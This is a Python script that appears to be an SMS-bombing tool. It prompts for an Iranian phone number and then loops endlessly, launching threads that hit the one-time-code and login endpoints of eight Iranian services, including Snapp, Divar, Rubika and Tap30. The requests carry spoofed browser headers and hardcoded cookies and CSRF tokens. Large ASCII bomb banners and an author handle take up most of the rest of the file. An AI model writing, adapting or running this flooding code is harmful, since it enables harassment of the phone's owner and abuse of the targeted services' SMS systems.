import os
import time
import requests
from threading import Thread
import colorama
import os
proxy = {"https": "127.0.0.1.8000"}
os.system("clear")
print(colorama.Fore.CYAN+'MAXTOR')
time.sleep(2)
os.system('clear')
print(colorama.Fore.RED+"""
                                # BOMB #
                           .7KBQBBBBBBBBBIr                           
                        i5RQQP1ri..   ..i7IbQQM2i                      
                    rQBBDY.                   .JgBBMr                  
                 rBQB7                             vBBBi               
               PBBr                                   vBQI             
             ZBD.                                       .QBX           
           IBg                                             BBv         
          BB.                                               .BB        
        vBY      qq.       ...:r::i.::i::i:..        :dI      XBi      
       DB     :BBR      ..: .:.  :  : ..  ::....       BBB.    .B2     
      BB   g:1BBi     .r:   .   ..  :  :.   .   :i.     7BQ7rd   Bb    
     gB   BE.BIi:   .:. ..:i.   i   i   :   .i:.. .:.   i:PB BB   BI   
    YB   BB :iIB   :.    ..  ..:: dd7BQ:.:..  ..    .:  .BJi. Qd   Bi  
    B  B BQ QBB   i     .:     :  BR XBB .     :.     i   BBD BB.B :B  
   BM PB BQBU:   :      i      i    :BM  i      i      i   iXBBB Bv BB 
  .B  BB Qu P7  i....  :.     ..    X    :      ..  ....i  u1 qg BB  B 
  BB  BB  rBB  i    ...i....  :.   .5    :. .....i...    :  BBi .BB  Bj
  B   BB DBZ  .:      ..   .i...# elf #...: .    :       :   BBI.BZ  iB
 jQ Y: BQB..  :       :.      :           .      ..      .:   :BMB Y: B
 BB MB RB  B  i       :       .   rEXEi   .       :       :  B  BS B1 B
 BZ vB: : BP  i.......:        1B .QBd  Bv       .:.......:  BB r vB: B
 BM  BB  BB   i . . . :  .:rUZBBB  rB:  BBBE1i:.  : ... . i   BB .BB  B
 BB  KBgiBY   :        rBBBBBBQB.   Q   iBBBBBBBBi        :   KB:BBL  B
 vB L YBBB Qi :        BBBBQBBBB:  5B7  7BBBBBBBBZ       .: LK BQQi r B
  B rB  BR Bd  :       BQBQBQBBBQ  MQS  QBQBBBBBBB       :  BB BB  B.:B
  QQ BB. : QB  :    . :BBBBBBBBBB7 bBs 5BBBBBBBBBB. .   ..  BB i :BB BY
   B  BBB  BQ i :...  :BBBBBQBBBBB:KBJiBBBBBBBBBBB   ..:. r BB  BBQ  B 
   BB  uBBiBB Bj .    PBBQBBBBBQBBBBBQBBBBBBBQBQBBJ    . dB BRrBB7  BQ 
    B. 7 vBBQ rB: .   QBBBBBBBBBBBBBQBBBBBBBBBBBBBZ   . 7B..BBBr 7 7B  
    7B iB.  K5 BB     BQBBBBBQBQBBBBBBBQBBBBBBBBBBB     BB D1  iB. Q:  
     bQ .BBP:: YBd 5  BBQBBBBBBBQBQBBBQBBBBBQBBBBBB  X BBi ::gBB  BJ   
      gB  rBBBBrZB.uB7BBBBBBBBBQBBBBBQBBBQBBBBBBBQBrBi:QqrBBBQ:  BI    
       KB.  ivqBMBB 1BBBBBBBBBBBBBBBBBBBBBBBBBBBBBQB7 BBMBSvi  :BY     
        rQ5 .u7:. :r .KQBBBBBBBBBQBQBBBBBBBBBBBQBQS  7: .:vJ  DB:      
          QB  iBBBBBBBBBQKrQQBBBBBBBBBBBBBBBQZrPQBBBBBBBBQ: .BB        
           7Bg   :i:..    iQBBBBBBBQBQBBBBBBBRi    ..:r.   BBi         
             XBR  .2ZQBBBBBBQBBBBBBBBBBBBBBBQBBBBBBQE1. .BBu           
               uBQi  .r7i  BBQBBBBBQBBBBBBBBBQ .rri.  rBBv             
                 :gBgi     BQBBBBBBBQBBBBBBBBB     rMBZ.               
                    idBBgrJBBBBBBBBBBBBBBBBBBB77QBBP:                  
                        .rv1XZMQQBBBBBBBQQgZSu7i            
                                  bay     """)
time.sleep(5) 
def snap(phone):

    snapH = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
    snapD = {"cellphone":phone}
    try:
        snapR = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD)
        if "OK" in snapR.text:
            print (colorama.Fore.GREEN+"{&}RAFT TOSH ")
            time.sleep(0.5)
        else:
            print (colorama.Fore.GREEN+"{&}RAFT MAXTOR")
    except:
        time.sleep(0.5)
        print (colorama.Fore.RED+"[%]NARAFT TOSH ")

def shad(phone):

    shadH = {"Host": "shadmessenger12.iranlms.ir","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "text/plain","origin": "https://shadweb.iranlms.ir","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://shadweb.iranlms.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    shadD = {"api_version":"3","method":"sendCode","data":{"phone_number":phone.split("+")[1],"send_type":"SMS"}}
    try:
        shadR = requests.post("https://shadmessenger12.iranlms.ir/", headers=shadH, json=shadD)
        if "OK" in shadR.text:
            print (colorama.Fore.GREEN+"{&}shad Send ")
            time.sleep(0.5)
        else:
            print (colorama.Fore.GREEN+"{&}RAFT TOSH ")
    except:
        time.sleep(0.5)
        print (colorama.Fore.RED+"[%]NARAFT TOSH ")

def gap(phone):

    gapH = {"Host": "core.gap.im","accept": "application/json, text/plain, */*","x-version": "4.5.7","accept-language": "fa","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","appversion": "web","origin": "https://web.gap.im","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.gap.im/","accept-encoding": "gzip, deflate, br"}
    try:
        gapR = requests.get("https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=gapH)
        if "OK" in gapR.text:
            print (colorama.Fore.GREEN+"{&}RAFT TOSH ")
            time.sleep(0.5)
        else:
            print (colorama.Fore.GREEN+"{&}RAFT TOSH ")
    except:
        time.sleep(0.5)
        print (colorama.Fore.RED+"[%]NARAFT TOSH ")

def tap30(phone):

    tap30H = {"Host": "tap33.me","Connection": "keep-alive","Content-Length": "63","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "application/json","Accept": "*/*","Origin": "https://app.tapsi.cab","Sec-Fetch-Site": "cross-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://app.tapsi.cab/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    tap30D = {"credential":{"phoneNumber":"0"+phone.split("+98")[1],"role":"PASSENGER"}}
    try:
        tap30R = requests.post("https://tap33.me/api/v2/user", headers=tap30H, json=tap30D)
        if "OK" in tap30R.text:
            print (colorama.Fore.GREEN+"{&}RAFT TOSH ")
            time.sleep(0.5)
        else:
            print (colorama.Fore.GREEN+"{&}RAFT TOSH ")
    except:
        time.sleep(0.5)
        print (colorama.Fore.RED+"[%]NARAFT TOSH ")

def divar(phone):

    divarH = {"Host": "api.divar.ir","Connection": "keep-alive","Content-Length": "22","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded","Origin": "https://divar.ir","Sec-Fetch-Site": "same-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://divar.ir/my-divar/my-posts","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    divarD = {"phone":phone.split("+98")[1]}
    try:
        divarR = requests.post("https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=divarD)
        if "SENT" in divarR.text:
            print (colorama.Fore.GREEN+"{&}RAFT TOSH ")
            time.sleep(0.5)
        else:
            print (colorama.Fore.GREEN+"{&}RAFT TOSH ")
    except:
        time.sleep(0.5)
        print (colorama.Fore.RED+"[%]NARAFT TOSH ")

def rubika(phone):

    ruH = {"Host": "messengerg2c4.iranlms.ir","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "text/plain","origin": "https://web.rubika.ir","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.rubika.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    ruD = {"api_version":"3","method":"sendCode","data":{"phone_number":phone.split("+")[1],"send_type":"SMS"}}
    try:
        ruR = requests.post("https://messengerg2c4.iranlms.ir/", headers=ruH, json=ruD)
        if "OK" in ruR.text:
            print (colorama.Fore.GREEN+"{&}RAFT TOSH ")
            time.sleep(0.5)
        else:
            print (colorama.Fore.GREEN+"{&}RAFT TOSH ")
    except:
        time.sleep(0.5)
        print (colorama.Fore.RED+"[&]NARAFT TOSH ")

def torob(phone):

    torobH = {"Host": "api.torob.com","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","accept": "*/*","origin": "https://torob.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://torob.com/user/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6","cookie": "amplitude_id_95d1eb61107c6d4a0a5c555e4ee4bfbbtorob.com\u003deyJkZXZpY2VJZCI6ImFiOGNiOTUyLTk1MTgtNDhhNS1iNmRjLTkwZjgxZTFjYmM3ZVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU5Njg2OTI4ODM1MSwibGFzdEV2ZW50VGltZSI6MTU5Njg2OTI4ODM3NCwiZXZlbnRJZCI6MSwiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjN9"}
    try:
        torobR = requests.get("https://api.torob.com/a/phone/send-pin/?phone_number=0"+phone.split("+98")[1], headers=torobH)
        if "sent" in torobR.text:
            print (colorama.Fore.GREEN+"{&}RAFT TOSH ")
            time.sleep(0.5)
        else:
            print (colorama.Fore.GREEN+"{&}RAFT TOSH ")
    except:
        time.sleep(0.5)
        print (colorama.Fore.RED+"[%]NARAFT TOSH ")

def bama(phone):

    bamaH = {"Host": "bama.ir","content-length": "22","accept": "application/json, text/javascript, */*; q\u003d0.01","x-requested-with": "XMLHttpRequest","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","csrf-token-bama-header": "CfDJ8N00ikLDmFVBoTe5ae5U4a2G6aNtBFk_sA0DBuQq8RmtGVSLQEq3CXeJmb0ervkK5xY2355oMxH2UDv5oU05FCu56FVkLdgE6RbDs1ojMo90XlbiGYT9XaIKz7YkZg-8vJSuc7f3PR3VKjvuu1fEIOE","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","origin": "https://bama.ir","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://bama.ir/Signin?ReturnUrl\u003d%2Fprofile","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6","cookie": "CSRF-TOKEN-BAMA-COOKIE\u003dCfDJ8N00ikLDmFVBoTe5ae5U4a1o5aOrFp-FIHLs7P3VvLI7yo6xSdyY3sJ5GByfUKfTPuEgfioiGxRQo4G4JzBin1ky5-fvZ1uKkrb_IyaPXs1d0bloIEVe1VahdjTQNJpXQvFyt0tlZnSAZFs4eF3agKg"}
    bamaD = "cellNumber=0"+phone.split("+98")[1]
    try:
        bamaR = requests.post("https://bama.ir/signin-checkforcellnumber", headers=bamaH, data=bamaD)
        if "0" in bamaR.text:
            print (colorama.Fore.GREEN+"{&}RAFT TOSH ")
            time.sleep(0.5)
        else:
            print (colorama.Fore.GREEN+"{&}RAFT TOSH ")
    except:
        time.sleep(0.5)
        print (colorama.Fore.RED+"[%]NARAFT TOSH ")

try:
    phone = str(input(colorama.Fore.CYAN+"shomare bezan begam (+98):==>  "))
    while True:
        Thread(target=snap, args=[phone]).start()
        Thread(target=shad, args=[phone]).start()
        Thread(target=gap, args=[phone]).start()
        Thread(target=tap30, args=[phone]).start()
        Thread(target=divar, args=[phone]).start()
        Thread(target=rubika, args=[phone]).start()
        Thread(target=torob, args=[phone]).start()
        Thread(target=bama, args=[phone]).start()
    
        


except:
    print(colorama.Fore.RED+""" 


                                    # MAXTOR #
                               .7KBQBBBBBBBBBIr                           
                           i5RQQP1ri..   ..i7IbQQM2i                      
                       rQBBDY.                   .JgBBMr                  
                    rBQB7                             vBBBi               
                  PBBr       my id => @CYROSIF       vBQI             
                ZBD.                                       .QBX           
              IBg                                             BBv         
             BB.                                               .BB        
           vBY      qq.       ...:r::i.::i::i:..        :dI      XBi      
          DB     :BBR      ..: .:.  :  : ..  ::....       BBB.    .B2     
         BB   g:1BBi     .r:   .   ..  :  :.   .   :i.     7BQ7rd   Bb    
        gB   BE.BIi:   .:. ..:i.   i   i   :   .i:.. .:.   i:PB BB   BI   
       YB   BB :iIB   :.    ..  ..:: dd7BQ:.:..  ..    .:  .BJi. Qd   Bi  
       B  B BQ QBB   i     .:     :  BR XBB .     :.     i   BBD BB.B :B  
      BM PB BQBU:   :      i      i    :BM  i      i      i   iXBBB Bv BB 
     .B  BB Qu P7  i....  :.     ..    X    :      ..  ....i  u1 qg BB  B 
     BB  BB  rBB  i    ...i....  :.   .5    :. .....i...    :  BBi .BB  Bj
     B   BB DBZ  .:      ..   .i...# elf #...: .    :       :   BBI.BZ  iB
    jQ Y: BQB..  :       :.      :           .      ..      .:   :BMB Y: B
    BB MB RB  B  i       :       .   rEXEi   .       :       :  B  BS B1 B
    BZ vB: : BP  i.......:        1B .QBd  Bv       .:.......:  BB r vB: B
    BM  BB  BB   i . . . :  .:rUZBBB  rB:  BBBE1i:.  : ... . i   BB .BB  B
    BB  KBgiBY   :        rBBBBBBQB.   Q   iBBBBBBBBi        :   KB:BBL  B
    vB L YBBB Qi :        BBBBQBBBB:  5B7  7BBBBBBBBZ       .: LK BQQi r B
     B rB  BR Bd  :       BQBQBQBBBQ  MQS  QBQBBBBBBB       :  BB BB  B.:B
     QQ BB. : QB  :    . :BBBBBBBBBB7 bBs 5BBBBBBBBBB. .   ..  BB i :BB BY
      B  BBB  BQ i :...  :BBBBBQBBBBB:KBJiBBBBBBBBBBB   ..:. r BB  BBQ  B 
      BB  uBBiBB Bj .    PBBQBBBBBQBBBBBQBBBBBBBQBQBBJ    . dB BRrBB7  BQ 
       B. 7 vBBQ rB: .   QBBBBBBBBBBBBBQBBBBBBBBBBBBBZ   . 7B..BBBr 7 7B  
       7B iB.  K5 BB     BQBBBBBQBQBBBBBBBQBBBBBBBBBBB     BB D1  iB. Q:  
        bQ .BBP:: YBd 5  BBQBBBBBBBQBQBBBQBBBBBQBBBBBB  X BBi ::gBB  BJ   
         gB  rBBBBrZB.uB7BBBBBBBBBQBBBBBQBBBQBBBBBBBQBrBi:QqrBBBQ:  BI    
          KB.  ivqBMBB 1BBBBBBBBBBBBBBBBBBBBBBBBBBBBBQB7 BBMBSvi  :BY     
           rQ5 .u7:. :r .KQBBBBBBBBBQBQBBBBBBBBBBBQBQS  7: .:vJ  DB:      
             QB  iBBBBBBBBBQKrQQBBBBBBBBBBBBBBBQZrPQBBBBBBBBQ: .BB        
              7Bg   :i:..    iQBBBBBBBQBQBBBBBBBRi    ..:r.   BBi         
                XBR  .2ZQBBBBBBQBBBBBBBBBBBBBBBQBBBBBBQE1. .BBu           
                  uBQi  .r7i  BBQBBBBBQBBBBBBBBBQ .rri.  rBBv             
                    :gBgi     BQBBBBBBBQBBBBBBBBB     rMBZ.               
                       idBBgrJBBBBBBBBBBBBBBBBBBB77QBBP:                  
                           .rv1XZMQQBBBBBBBQQgZSu7i
    """)
    time.sleep(0.4)

    os.system('clear')

    print(colorama.Fore.RED+"""


                                    # MAX #
                               .7KBQBBBBBBBBBIr                           
                           i5RQQP1ri..   ..i7IbQQM2i                      
                       rQBBDY.                   .JgBBMr                  
                    rBQB7                             vBBBi               
                  PBBr       my id => @CYROSIF      vBQI             
                ZBD.                                       .QBX           
              IBg                                             BBv         
             BB.                                               .BB        
           vBY      qq.       ...:r::i.::i::i:..        :dI      XBi      
          DB     :BBR      ..: .:.  :  : ..  ::....       BBB.    .B2     
         BB   g:1BBi     .r:   .   ..  :  :.   .   :i.     7BQ7rd   Bb    
        gB   BE.BIi:   .:. ..:i.   i   i   :   .i:.. .:.   i:PB BB   BI   
       YB   BB :iIB   :.    ..  ..:: dd7BQ:.:..  ..    .:  .BJi. Qd   Bi  
       B  B BQ QBB   i     .:     :  BR XBB .     :.     i   BBD BB.B :B  
      BM PB BQBU:   :      i      i    :BM  i      i      i   iXBBB Bv BB 
     .B  BB Qu P7  i....  :.     ..    X    :      ..  ....i  u1 qg BB  B 
     BB  BB  rBB  i    ...i....  :.   .5    :. .....i...    :  BBi .BB  Bj
     B   BB DBZ  .:      ..   .i...# elf #...: .    :       :   BBI.BZ  iB
    jQ Y: BQB..  :       :.      :           .      ..      .:   :BMB Y: B
    BB MB RB  B  i       :       .   rEXEi   .       :       :  B  BS B1 B
    BZ vB: : BP  i.......:        1B .QBd  Bv       .:.......:  BB r vB: B
    BM  BB  BB   i . . . :  .:rUZBBB  rB:  BBBE1i:.  : ... . i   BB .BB  B
    BB  KBgiBY   :        rBBBBBBQB.   Q   iBBBBBBBBi        :   KB:BBL  B
    vB L YBBB Qi :        BBBBQBBBB:  5B7  7BBBBBBBBZ       .: LK BQQi r B
     B rB  BR Bd  :       BQBQBQBBBQ  MQS  QBQBBBBBBB       :  BB BB  B.:B
     QQ BB. : QB  :    . :BBBBBBBBBB7 bBs 5BBBBBBBBBB. .   ..  BB i :BB BY
      B  BBB  BQ i :...  :BBBBBQBBBBB:KBJiBBBBBBBBBBB   ..:. r BB  BBQ  B 
      BB  uBBiBB Bj .    PBBQBBBBBQBBBBBQBBBBBBBQBQBBJ    . dB BRrBB7  BQ 
       B. 7 vBBQ rB: .   QBBBBBBBBBBBBBQBBBBBBBBBBBBBZ   . 7B..BBBr 7 7B  
                    7B iB.  K5 BB     BQBBBBBQBQBBBBBBBQBBBBBBBBBBB     BB D1  iB. Q:  
        bQ .BBP:: YBd 5  BBQBBBBBBBQBQBBBQBBBBBQBBBBBB  X BBi ::gBB  BJ   
         gB  rBBBBrZB.uB7BBBBBBBBBQBBBBBQBBBQBBBBBBBQBrBi:QqrBBBQ:  BI    
          KB.  ivqBMBB 1BBBBBBBBBBBBBBBBBBBBBBBBBBBBBQB7 BBMBSvi  :BY     
           rQ5 .u7:. :r .KQBBBBBBBBBQBQBBBBBBBBBBBQBQS  7: .:vJ  DB:      
             QB  iBBBBBBBBBQKrQQBBBBBBBBBBBBBBBQZrPQBBBBBBBBQ: .BB        
                              7Bg   :i:..    iQBBBBBBBQBQBBBBBBBRi    ..:r.   BBi         
                XBR  .2ZQBBBBBBQBBBBBBBBBBBBBBBQBBBBBBQE1. .BBu           
                  uBQi  .r7i  BBQBBBBBQBBBBBBBBBQ .rri.  rBBv             
                    :gBgi     BQBBBBBBBQBBBBBBBBB     rMBZ.               
                       idBBgrJBBBBBBBBBBBBBBBBBBB77QBBP:                  
                           .rv1XZMQQBBBBBBBQQgZSu7i
    """)

    time.sleep(0.4)

    os.system('clear')

    print(colorama.Fore.RED+"""


                                    # MAX #
                               .7KBQBBBBBBBBBIr                           
                           i5RQQP1ri..   ..i7IbQQM2i                      
                       rQBBDY.                   .JgBBMr                  
                    rBQB7                             vBBBi               
                  PBBr       my id => @CYROSIF   vBQI             
                ZBD.                                       .QBX           
              IBg                                             BBv         
             BB.                                               .BB        
           vBY      qq.       ...:r::i.::i::i:..        :dI      XBi      
          DB     :BBR      ..: .:.  :  : ..  ::....       BBB.    .B2     
         BB   g:1BBi     .r:   .   ..  :  :.   .   :i.     7BQ7rd   Bb    
        gB   BE.BIi:   .:. ..:i.   i   i   :   .i:.. .:.   i:PB BB   BI   
       YB   BB :iIB   :.    ..  ..:: dd7BQ:.:..  ..    .:  .BJi. Qd   Bi  
       B  B BQ QBB   i     .:     :  BR XBB .     :.     i   BBD BB.B :B  
      BM PB BQBU:   :      i      i    :BM  i      i      i   iXBBB Bv BB 
     .B  BB Qu P7  i....  :.     ..    X    :      ..  ....i  u1 qg BB  B 
     BB  BB  rBB  i    ...i....  :.   .5    :. .....i...    :  BBi .BB  Bj
     B   BB DBZ  .:      ..   .i...# elf #...: .    :       :   BBI.BZ  iB
    jQ Y: BQB..  :       :.      :           .      ..      .:   :BMB Y: B
    BB MB RB  B  i       :       .   rEXEi   .       :       :  B  BS B1 B
    BZ vB: : BP  i.......:        1B .QBd  Bv       .:.......:  BB r vB: B
    BM  BB  BB   i . . . :  .:rUZBBB  rB:  BBBE1i:.  : ... . i   BB .BB  B
    BB  KBgiBY   :        rBBBBBBQB.   Q   iBBBBBBBBi        :   KB:BBL  B
    vB L YBBB Qi :        BBBBQBBBB:  5B7  7BBBBBBBBZ       .: LK BQQi r B
     B rB  BR Bd  :       BQBQBQBBBQ  MQS  QBQBBBBBBB       :  BB BB  B.:B
     QQ BB. : QB  :    . :BBBBBBBBBB7 bBs 5BBBBBBBBBB. .   ..  BB i :BB BY
      B  BBB  BQ i :...  :BBBBBQBBBBB:KBJiBBBBBBBBBBB   ..:. r BB  BBQ  B 
      BB  uBBiBB Bj .    PBBQBBBBBQBBBBBQBBBBBBBQBQBBJ    . dB BRrBB7  BQ 
       B. 7 vBBQ rB: .   QBBBBBBBBBBBBBQBBBBBBBBBBBBBZ   . 7B..BBBr 7 7B  
                 7B iB.  K5 BB     BQBBBBBQBQBBBBBBBQBBBBBBBBBBB     BB D1  iB. Q:  
        bQ .BBP:: YBd 5  BBQBBBBBBBQBQBBBQBBBBBQBBBBBB  X BBi ::gBB  BJ   
         gB  rBBBBrZB.uB7BBBBBBBBBQBBBBBQBBBQBBBBBBBQBrBi:QqrBBBQ:  BI    
          KB.  ivqBMBB 1BBBBBBBBBBBBBBBBBBBBBBBBBBBBBQB7 BBMBSvi  :BY     
           rQ5 .u7:. :r .KQBBBBBBBBBQBQBBBBBBBBBBBQBQS  7: .:vJ  DB:      
       QB  iBBBBBBBBBQKrQQBBBBBBBBBBBBBBBQZrPQBBBBBBBBQ: .BB        
              7Bg   :i:..    iQBBBBBBBQBQBBBBBBBRi    ..:r.   BBi         
                XBR  .2ZQBBBBBBQBBBBBBBBBBBBBBBQBBBBBBQE1. .BBu           
                  uBQi  .r7i  BBQBBBBBQBBBBBBBBBQ .rri.  rBBv             
                    :gBgi     BQBBBBBBBQBBBBBBBBB     rMBZ.               
                       idBBgrJBBBBBBBBBBBBBBBBBBB77QBBP:                  
                           .rv1XZMQQBBBBBBBQQgZSu7i
    """)

    time.sleep(0.4)

    os.system('clear')

    print(colorama.Fore.RED+"""


                                    # MAX #
                               .7KBQBBBBBBBBBIr                           
                           i5RQQP1ri..   ..i7IbQQM2i                      
                       rQBBDY.                   .JgBBMr                  
                    rBQB7                             vBBBi               
                  PBBr       my id => @CYROSIF       vBQI             
                ZBD.                                       .QBX           
              IBg                                             BBv         
                         BB.                                               .BB        
           vBY      qq.       ...:r::i.::i::i:..        :dI      XBi      
          DB     :BBR      ..: .:.  :  : ..  ::....       BBB.    .B2     
         BB   g:1BBi     .r:   .   ..  :  :.   .   :i.     7BQ7rd   Bb    
        gB   BE.BIi:   .:. ..:i.   i   i   :   .i:.. .:.   i:PB BB   BI   
       YB   BB :iIB   :.    ..  ..:: dd7BQ:.:..  ..    .:  .BJi. Qd   Bi  
       B  B BQ QBB   i     .:     :  BR XBB .     :.     i   BBD BB.B :B  
      BM PB BQBU:   :      i      i    :BM  i      i      i   iXBBB Bv BB 
     .B  BB Qu P7  i....  :.     ..    X    :      ..  ....i  u1 qg BB  B 
     BB  BB  rBB  i    ...i....  :.   .5    :. .....i...    :  BBi .BB  Bj
     B   BB DBZ  .:      ..   .i...# elf #...: .    :       :   BBI.BZ  iB
    jQ Y: BQB..  :       :.      :           .      ..      .:   :BMB Y: B
    BB MB RB  B  i       :       .   rEXEi   .       :       :  B  BS B1 B
    BZ vB: : BP  i.......:        1B .QBd  Bv       .:.......:  BB r vB: B
    BM  BB  BB   i . . . :  .:rUZBBB  rB:  BBBE1i:.  : ... . i   BB .BB  B
    BB  KBgiBY   :        rBBBBBBQB.   Q   iBBBBBBBBi        :   KB:BBL  B
    vB L YBBB Qi :        BBBBQBBBB:  5B7  7BBBBBBBBZ       .: LK BQQi r B
     B rB  BR Bd  :       BQBQBQBBBQ  MQS  QBQBBBBBBB       :  BB BB  B.:B
     QQ BB. : QB  :    . :BBBBBBBBBB7 bBs 5BBBBBBBBBB. .   ..  BB i :BB BY
      B  BBB  BQ i :...  :BBBBBQBBBBB:KBJiBBBBBBBBBBB   ..:. r BB  BBQ  B 
       BB  uBBiBB Bj .    PBBQBBBBBQBBBBBQBBBBBBBQBQBBJ    . dB BRrBB7  BQ 
       B. 7 vBBQ rB: .   QBBBBBBBBBBBBBQBBBBBBBBBBBBBZ   . 7B..BBBr 7 7B  
       7B iB.  K5 BB     BQBBBBBQBQBBBBBBBQBBBBBBBBBBB     BB D1  iB. Q:  
        bQ .BBP:: YBd 5  BBQBBBBBBBQBQBBBQBBBBBQBBBBBB  X BBi ::gBB  BJ   
                      gB  rBBBBrZB.uB7BBBBBBBBBQBBBBBQBBBQBBBBBBBQBrBi:QqrBBBQ:  BI    
          KB.  ivqBMBB 1BBBBBBBBBBBBBBBBBBBBBBBBBBBBBQB7 BBMBSvi  :BY     
           rQ5 .u7:. :r .KQBBBBBBBBBQBQBBBBBBBBBBBQBQS  7: .:vJ  DB:      
             QB  iBBBBBBBBBQKrQQBBBBBBBBBBBBBBBQZrPQBBBBBBBBQ: .BB        
              7Bg   :i:..    iQBBBBBBBQBQBBBBBBBRi    ..:r.   BBi         
                XBR  .2ZQBBBBBBQBBBBBBBBBBBBBBBQBBBBBBQE1. .BBu           
                  uBQi  .r7i  BBQBBBBBQBBBBBBBBBQ .rri.  rBBv             
                    :gBgi     BQBBBBBBBQBBBBBBBBB     rMBZ.               
                       idBBgrJBBBBBBBBBBBBBBBBBBB77QBBP:                  
                           .rv1XZMQQBBBBBBBQQgZSu7i
    """)

    time.sleep(0.4)

    os.system('clear')

    print(colorama.Fore.RED+"""


                                    # MAX #
                               .7KBQBBBBBBBBBIr                           
                           i5RQQP1ri..   ..i7IbQQM2i                      
                       rQBBDY.                   .JgBBMr                  
                    rBQB7                             vBBBi               
                  PBBr       my id => @CYROSIF       vBQI             
                ZBD.                                       .QBX           
              IBg                                             BBv         
             BB.                                               .BB        
           vBY      qq.       ...:r::i.::i::i:..        :dI      XBi      
          DB     :BBR      ..: .:.  :  : ..  ::....       BBB.    .B2     
         BB   g:1BBi     .r:   .   ..  :  :.   .   :i.     7BQ7rd   Bb    
        gB   BE.BIi:   .:. ..:i.   i   i   :   .i:.. .:.   i:PB BB   BI   
       YB   BB :iIB   :.    ..  ..:: dd7BQ:.:..  ..    .:  .BJi. Qd   Bi  
       B  B BQ QBB   i     .:     :  BR XBB .     :.     i   BBD BB.B :B  
      BM PB BQBU:   :      i      i    :BM  i      i      i   iXBBB Bv BB 
     .B  BB Qu P7  i....  :.     ..    X    :      ..  ....i  u1 qg BB  B 
     BB  BB  rBB  i    ...i....  :.   .5    :. .....i...    :  BBi .BB  Bj
     B   BB DBZ  .:      ..   .i...# elf #...: .    :       :   BBI.BZ  iB
    jQ Y: BQB..  :       :.      :           .      ..      .:   :BMB Y: B
    BB MB RB  B  i       :       .   rEXEi   .       :       :  B  BS B1 B
    BZ vB: : BP  i.......:        1B .QBd  Bv       .:.......:  BB r vB: B
    BM  BB  BB   i . . . :  .:rUZBBB  rB:  BBBE1i:.  : ... . i   BB .BB  B
    BB  KBgiBY   :        rBBBBBBQB.   Q   iBBBBBBBBi        :   KB:BBL  B
    vB L YBBB Qi :        BBBBQBBBB:  5B7  7BBBBBBBBZ       .: LK BQQi r B
     B rB  BR Bd  :       BQBQBQBBBQ  MQS  QBQBBBBBBB       :  BB BB  B.:B
